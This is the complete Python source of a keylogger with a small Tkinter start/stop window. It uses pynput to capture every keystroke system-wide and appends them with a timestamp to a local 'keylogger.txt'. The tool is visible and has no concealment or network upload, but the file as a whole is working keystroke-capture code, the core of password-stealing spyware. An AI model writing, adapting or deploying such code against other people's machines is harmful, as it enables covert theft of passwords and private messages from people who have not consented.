from pynput import keyboard
from pynput.keyboard import Key,Listener
from datetime import datetime
from tkinter import Tk, Label, Button
import json

keys = []
listener = None

with open("keylogger.txt", "a") as f:
    f.write("TimeStamps"+(str(datetime.now()))[:-7]+":\n")
    f.write("\n")
    
def on_press(key):
    global count, keys
    keys.append(key)
    write_file(keys)
    keys =[]

def on_release(key):
    if key == Key.esc:
        return False
        
        
        
def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for idx, key in enumerate(keys):
            k = str(keys).replace("'", "")
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
                


        

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text="Click Start to begin keylogging.")
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack()

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack()

root.geometry("300x110")  # Set the window size to 300x110 pixels

root.mainloop()
